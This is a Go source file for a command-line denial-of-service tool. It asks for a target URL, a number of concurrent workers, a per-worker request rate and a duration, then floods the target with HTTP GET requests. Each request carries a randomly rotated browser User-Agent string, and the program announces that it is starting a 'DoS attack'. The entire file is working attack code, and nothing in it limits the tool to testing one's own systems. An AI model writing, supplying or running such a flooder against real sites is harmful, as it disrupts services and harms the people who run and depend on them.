package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"sync"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1",
	"Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 XL Build/OPD1.170816.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Mobile Safari/537.36",
}

// Function to generate a random user agent
func randomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func main() {
	// Get user inputs
	targetURL := getInput("Enter target URL (e.g., http://example.com): ")
	numGoroutines := getIntInput("Enter number of concurrent workers (e.g., 100): ")
	requestsPerSec := getIntInput("Enter requests per second per worker (e.g., 10): ")
	duration := getIntInput("Enter attack duration in seconds (e.g., 30): ")

	fmt.Printf("Starting DoS attack on %s with %d goroutines, sending %d requests per second for %d seconds.\n", targetURL, numGoroutines, requestsPerSec, duration)

	var wg sync.WaitGroup
	stop := make(chan bool)

	for i := 0; i < numGoroutines; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			ticker := time.NewTicker(time.Second / time.Duration(requestsPerSec))
			for {
				select {
				case <-stop:
					return
				case <-ticker.C:
					sendRequest(id, targetURL)
				}
			}
		}(i)
	}

	// Wait for the specified duration, then stop the attack
	time.Sleep(time.Duration(duration) * time.Second)
	close(stop)
	wg.Wait()

	fmt.Println("Attack finished.")
}

// sendRequest sends an HTTP GET request with a random User-Agent header
func sendRequest(workerID int, targetURL string) {
	client := &http.Client{Timeout: 10 * time.Second}

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		fmt.Printf("Worker %d: Error creating request: %v\n", workerID, err)
		return
	}

	req.Header.Set("User-Agent", randomUserAgent())

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Worker %d: Error sending request: %v\n", workerID, err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("Worker %d: Received response: %s\n", workerID, resp.Status)
}

// getInput prompts the user for input and returns the entered string
func getInput(prompt string) string {
	fmt.Print(prompt)
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	return scanner.Text()
}

// getIntInput prompts the user for an integer input and returns it
func getIntInput(prompt string) int {
	for {
		input := getInput(prompt)
		var result int
		_, err := fmt.Sscanf(input, "%d", &result)
		if err == nil && result > 0 {
			return result
		}
		fmt.Println("Invalid input, please enter a positive integer.")
	}
}
